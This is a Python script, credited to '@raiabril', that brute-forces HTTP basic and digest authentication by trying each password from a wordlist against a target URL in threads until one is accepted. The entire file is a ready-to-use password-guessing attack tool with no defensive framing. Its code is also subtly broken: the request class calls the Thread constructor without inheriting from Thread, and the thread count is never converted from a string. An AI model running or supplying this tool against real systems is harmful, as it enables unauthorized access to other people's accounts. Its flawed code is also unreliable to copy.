#!/usr/bin/env python3
"""
brute_basic_auth.py - Script to brute force basic auth.

Usage: python3 brute_basic_auth.py <domain> <username> <wordlist> <threads>

Author: @raiabril

"""

from re import I
import requests
from threading import Thread
import sys
from time import sleep
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print("""
    ###########################################################
    #                                                         #
    # brute_basic_auth.py                                     #
    #                                                         #
    # A script to brute force basic auth.                     #
    #                                                         #
    #                                                         #
    # Author: @raiabril                                       #
    #                                                         #
    ###########################################################""")


def start(argv):
    banner()
    if len(argv) < 5:
        usage()
        sys.exit(0)
    
    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t:", ["username=", "wordlist=", "file=", "method=", "threads="])
    except getopt.GetoptError:
        print("[!!] Error on arguments")
        sys.exit()

    
    for opt, arg in opts:
        if opt == '-u':
            username = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictionary = arg
        elif opt == '-m':
            method = arg
        elif opt == '-t':
            threads = arg

    try:
        with open(dictionary, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[!!] The file doesn't exists")
        sys.exit()
    
    launcher_threads(passwords, threads, username, url, method)

def usage():
    print("""
    Usage:
        -w <domain>
        -u <username> 
        -t <threads>
        -f <wordlist>
        -m <method>
    """)

def launcher_threads(passwords, threads, username, url, method):
    """ Function to launch the threads. """

    global i

    i = []
    i.append(0) # Append 0 to the list of threads.

    while len(passwords):
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] = i[0] +1 # Add 1 to the global thread counter
                    thread = request_performer(passwd, username, url, method)
                    thread.start()

            except KeyboardInterrupt:
                print("[!!] Interrupted!! ")
                sys.exit()
            
            thread.join()


class request_performer():
    def __init__(self, passwd, username, url, method):
        Thread.__init__(self)
        self.passwd = passwd.split("\n")[0]
        self.username = username
        self.url = url
        self.method = method
        print(f"[-] Trying {self.passwd}")

    def run(self):
        global hit
        if hit == "1":
            try:
                if self.method == "basic":
                    response = requests.get(self.url, auth=(self.username, self.passwd))
                elif self.method == "digest":
                    response = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.passwd))

                if response.status_code == 200:
                    hit = "0"
                    print(f"[+] Password found {self.passwd}")
                    sys.exit()

                else:
                    print(f"[!!] Not valid password {self.passwd}")
                    i[0] = i[0]-1 # Remove the thread from the counter

            except requests.ConnectionError:
                pass


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("[!!] Interrupted")